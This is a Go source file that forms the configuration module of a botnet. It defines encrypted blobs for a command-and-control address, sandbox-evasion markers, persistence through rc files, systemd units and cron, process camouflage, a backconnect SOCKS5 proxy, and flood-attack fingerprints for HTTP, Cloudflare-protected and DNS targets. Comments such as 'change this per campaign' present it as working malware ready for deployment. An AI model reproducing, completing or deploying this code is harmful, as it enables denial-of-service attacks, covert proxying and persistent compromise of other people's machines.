package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "d0509911" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "^$Jxg5PWbuqE5&x&" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V3_1" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("9b417e13989de7897ac79a737af354ba4972339260ca8bf7f3c70785ddfde8e9d12ff4026dc3fd6a8dba20fa") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("41f6bc45f3ca2ff417e9510f1fd4a6988e382c8e1327369c5ab63fc1600648430843a7f014ac288aed34d118d31d8b1360a27dc8b47741a491a6474a989bad6171c1b4cfcc1f2d2117f1432b10c86e0550895f8086c1924c87fe3b6d410c02230673c1a2e15824ce0d71edcfad9c5a4570b3c6032e54d9fd7f20")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("b58608013f385652835f69c1cbaed51ffdec4e24714ff123e9498d5ba289aba8a542ab1b60cc4578f830100d62142d899d3493d2da157de0cc5416303aaaeb12b83b11a0ca9bd06b90b2e88e03ec236c69f55af749ae395027a8796be4fef334c4c80aff4e1b225651597ac93aa6584e771aba631a572f1e221d46dd3c356823df9b25c9c303d3fa96479310c0c676252a320fe9daf60f619dd82d2edf062eb8afd17e4962754fb9d57614070d0f562febd7b7a8a3a1f0284520cd333e94e4fd09c0045b3fc97ee1539eed434892c5fe60aa0619359de4fc51be927997301df53d9621f648518a2701d14a6218269a55e754dcafa7bf2b2575156976447c10feb15912b55a26188ff3e6bf87c32da0e8198627db9e2d30010e2fd621fabb6b060c05a1182ffd5deae009ef311d96e7eea78e5474e3323faf14ee8e474388ba9ecbc2db8f1c30946c5dcdabc1fe98cd84d45f4090804a6eb7cdb5e34e4a48f997af10601920a1c532e2ed39f69d5b5e7f7075998ff3b8ac1ca9fa2b88e9714ad6462456e2c10da3ddc218e3925c42358593c15e6e87ede6828d29bec6e3a939cdc8e29847a811b50a9975a888c64cac0804d32edb82108628e6267a2788d7b8f51217df409445f9ac9d8878dbec31d571c19ca4f55dd5737fbecee5d92fd2b435e33901d824ff728ea50caa81e63ec12681afddb08f5d7f0d97108abc8d9958b6c38341ae946f066381eff6759457a620185d3ebc749548fcb42dde6e3bbfa508b9f21cb38977fcf094cdd3e6ca39330ba4d5925e9e1cd9b6005c9111b286dc4bfbcabcbfb3b8faa3aad5a77ba0343939d582ed568892100663d8ca1f47a23461182014dca1dd3e93c4b3d2badc085454fae7552393ceef9f5a5900253b06c8df7971899417f198f2f65c638e9d920a8d81b9ef0fcc18ca9c05f85afd7b1371854268bd6b2828010151b96c26e59c2e756ee26699300162d24ff41d004c806fbcc0e130255ac4a86ba42c183f3db177c14d7c8b6cb793e929f40abccd452cb4a62d1950bd7845cbf51a0b5e86d78d7ad2ba96261ff20dabd208093d7cbd2dcfdebc4f800f2dccb7bf247b19289a4e03705259540b9e12fc61679b2db0d9073d40381f05f7a578aa368dfca0f9fbb03cad303003243cb20a3738a6")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("c3885ccef7e9db529e03c07964fb3c83a2841f56c0c8f2b14c1dd63b8a370c5e8505b80a0a96a3ad3c37c81aecdc406e96364088e38b91b86ac2dd3fd8b3abc1b06f8967563236af0f57685e8d1ab4a3158d7e9ff903079bc429db5091d9c99c377ae593bb323b24b4b73aa53cb376c995b36ea59591e11bc05f54ce")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("bf3112ec329a3b72df68397a3e5e839b641468b2136d5eeeb03f310fbd")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("706cb25793880c2854cdf32cbd7eee97eebabab4077486dc87e27f69a5e93e116047ced63b")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("ce3f7472309223088b53d1de917e1fe235c5c0f129dd4044789da4d423ae36")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("0e22c11249bb425468986d8e00bd7ac828efcb571e4c9791f1541f2382")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("41f9f7d9f38eeaad2de5943860fbc19842cce9e468e0b78362ef32d3ac21919b8a2902dc7f639473cc22acc9174dd86b42a56b7b3483db")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("fbdf0723c0d564a5f0d1b85ef645ef6440a82921b897907cb8be5d8c5463e24ab99954")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("6060d3debe7ca393b058c101f3baf4cf2aa5b14ae82b414437c2951bd91bda0b341ac3555389a56516258203515f74a79bcbeea82e86f309f2074861d76ff337751a74ccc6ec423ecb1e4c2deb9a2a8efffbf72ec29afb685744d04b64e00cbb652e2c0a9cb48a0bbe761a8a10f0314acb78c79c9627a352edf6e17904e366c4bccc74ad8b538c0f968acd41d09c57169f1d34b05b3900622c3a6c77bd77378c1f4e4e32454fdc1c3bf44a14572b492a138e8c0c331a03d4c5320660b4831716eb75f833cb684619fba3e12c7e29cd")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("40f5a866a2d42132ca60a37555fafcb31333fdf03f11d2afb01ce7c9262c499d21cf896296a71f474b7382b749a4da49f0b55ebe5bf5accf25cd94ecc8d43530e1283f22ecf0cc9b6e36e13abead8c5907ba08b697d3b0f5010c84ac0b7275dd4f0e882d7543f3edf5e358ea1019a6f28ab5af9c3951dd0ce3faa3f02d1a08c35e622797e55ce5be811f187ec7c9e3f4de6c4c560789e19067ea4ca94bff8bec36e12e64d982533ff8a2c04ade33325943f1a2d9e07664515eef008643d1901c66df1b7233b3")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("e6cb833e06490877363ae2f76c960f2caab9b2c25b7c9b6a6b")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("aa875dca4c9393a57ab8b4a217df5fe409c1eb68b47ec5a79304071550")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("0c984ccf853fa5408ed561056d115bbd5e396ac017995a9db5567e02febaadb010d26dbeea475d")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("d485f0d0f1bbc4542027acc9326e398a23acdd959e5c2662e7a0377487629f591a0b2db52299c65c5db3f0")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("6a90df38011defa63fd3e89c70f39574907637361165261cbbcab22c92ab4e")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("9cd41fba7d6ff7941306a193dcfdedfc972bad43d329a15eb221f4ea")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("68b9874cddf9a6f1820c666b5840a6eefde049ad3bc553071b2f9fc10dd5a6cecf8e1ca8354fd380e9741fd96088632c")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("518689dcdbff72f0dff68d4fe267eaf616664935")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("b8a3ef60bef2629ad72c8095a5495166258fc0b1b6")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("0c7b733b4ab86110a1cd93e5899aaab053cc7f36ae08057a744aa541444122")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("020966722889cbb72a5d1021397bfdccf88615bfc98a2db9fae8")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("cafb826f7d1aa8e1adcdaf31fe944cd65159b0af873372a52068fc")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("256007c58b2264218790395306607fa9968ba69aff8b7ae4f681a5")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("71a1d8b841b889d5a62393cb61f2592d56f2cd801a8728b17d65db33325215")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("febf3f9e057901a8e7c574f01ff7156ec75be9ac125dc127ea5d451f4ca2fd9dc58f9ccc09d219adf1f12241a823d919f2b91e7726")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("f2a0a00c7d6ec540815ef895603d2ad6dadcaf4b20a1bde8e6")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("27c8df3bbeb09bcd831aa5919616755850c07ab7d44968fb6f18af6c30c625887a57")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("0804a9b41d1e423f6ff8dbd7611b0b268250a721a163e74f58f4a5b9b4a1134c6caf40c1331f9d5410a200211262")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("3a42f9bfbf95bb674d1c68d55cab43b19aff3d40e2eeb9cb664c7e59c0abf349a0d32f7e64f696bb0e46b5a0")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("33890ec1c2ed53f8cb05f3b473d7dc28eea4f4019798724c60fb1ce5d1ba64923bf742fe06bbc06dba42035f2e38d0443d3e5eb23a55d08e6c56")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("93946663e899f01bdd536dc5db07ea844e8664bd404e493128043759ed7dccf1")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("2d0cde9957d14be4489ee7d1ee151ee40228bc08e26f9ff8a32aeaacdc3ac587513fa39ef385fdc595aa9c99f6a20ad8")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("ddeaf3efbc29cf3f88493f48aba7ecec677dbcb645db146414d9ef223cccc119651e962ec2")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("9e095a30ef391a74a60b5b0a72733b9f8abc9bb0fe12d61b3515668e0a92c41188b8b489a7c14cb7db1c3185752428")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("e5f62048bbf421ca3a90e39a10114f387aab858b6e8c7358000fd720a06c2a2678a71dd36ffead1df11a66f5948aa050253f5617db61a90419ef15dcd96174ef44b6ece5d3abe409b92ab66911f189fa566c86d9c5ba6c2fa6ae143bc46f3809e9e37c9cf3fc642d7a2e7ca1f2e53463c6")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("2060b67355e9d870278f1064e0c24086dd45d9e79cad5d8cd9ddcffe226b0203eb9be1ca2e69058693c5d6de3b62467709c90e570ba3d83a17266c7e7e0e00c175f55c847278f8508890d29a7bbea61dba")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("50f5a7e57cee396bbea6e3de8d8cb502a08abb33c57d03cb938b5346b15029739ce61bb5298fb046d575924ee1a61307eeb3399c60672eaaec29264e7fdbfd92c8e608bb7f818ca654a2f3aa7a9b")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("d66b8ee75518631f69afbdb64d15d49edbb2fd3219f1590c28bf80135698f3567cd2d3e6d0b155867092a7cfc063ea1b16aa06370c8ca8e1282e9a4d212522a773cdf2a5c43214e942cd32fbda")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("a00ddefd5c992576aee95df0defd24cc5cd0c3e58ddbbd8e540885758acbd9b48e71cb72f7be8e7916801c3b62982d7338a8de37134c7c83e317b8dd3a88b8")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("95bbd82e01d4aef0fb4a712ebd69ab469ee5cc9dba15b32d310dbbb6cc5eecd68dcca1f3")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("dc93982c7ee8f6072b9d94a7643a5bf130505450efcfd618c3bf0c1d0913fa076dc7ab8a008aa83584f2960b60796c5bf4bae358a6e9bed2c38e15fb58d9e56eda0e39530adfcd1c81b6d3b700ea4abb65aa3e993cc21fd81dd7af9948b37084ef1d712f3bad4b20c993f743247282c767bf56f2693e4287caec87eb86efe2218ec592692435f1b70a8307544a20a0d799469e9d5833e423bc33daf60d20a38b907522abd724b7d4f5656c9b4c49fcdc3c2279d2cbf6e6fa8fd34958d2b33b1726a46fe3f68b6bdb6d0e1cd92d85211e9b0d858bfd1d669a8e526286b6")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("9014f7b27762c9f325760ad38a6a1b0b6ad374da3614cc0cfb568682783adc28006a499135c489d07bdba52b26dd20a3150180001f08413dee42d48c45ab4f69699353d4a1e6ab142ba075fd39e01608a3ba37ffc2b386b80334eb")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("2e18163618b7c6ebfb07430f269eee50c2c67aa73119aa3a341d073a81c1e1efd2d935acd29885fad9fb5928631532b9a4baa9522e57445a7b6ebf")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("9ce89eba4e8df63ad70049118c8b90da7dfd988254625668869b4fd394b57aa5e522b8d705b13f1ebda29562f0bf32c79721dba5023ef503ca268b166d271fedf973b5c770f3089f14")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("b6510690bcf8e1fdf9d3bd5d172f1a876d73865f4cf078")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("ca0833d37ca980d4fbea4156f497f455d6ab03e016efb60c7e39b536b56ce789452a")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("3a8adeddb13eedd504cd54b435ef97e8949d9542fe5e67aee743ca5573e749d8d676e545c2643121c279d26d839e765b14fa06388108ee6e487a52500eddbf9fa09ef0ef91708edbcf337b7b3b7f56fb3bc4dd3eed94aceabde24af7991ad7")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("8c56675056548c7016a9c9ba1d0aa443571a")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("823ec0bb6137fa73f12572f301f9233b5a8e2e3fdedc2a1c1f60824f48532926f22dd17bdc1a158e6de28e779c00326dafd84ad72a")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("e55230ed0eae24c93f6924a6e05230aabc39")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("ad9fb4b472f03a05f8e9270ddd5116e3c161")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("b570b14705a9856804e8979be163627213dc8d1123df")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("d60ecc0af072a3826d22bf9d840312f76d032c3d56b43904")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("7571d5ff700c148833a7520df788b90467a8209006")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("9ec3670ee3fdebc3b8db50d70fee2ea79053")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("abca1dc943abffddc2c8e32af7f2496894e4b7f737180b8e35")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("54701f2c2321f5f22aa5dbdb098dec9f10c0e0e8a1296c7a76")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("8ccc75030d94b7e6cb44bc2b34dd5fd99267b83d6242bc")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("59762e42e7360fe6360e5db2e9d2ff0ee5ac4ea7")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
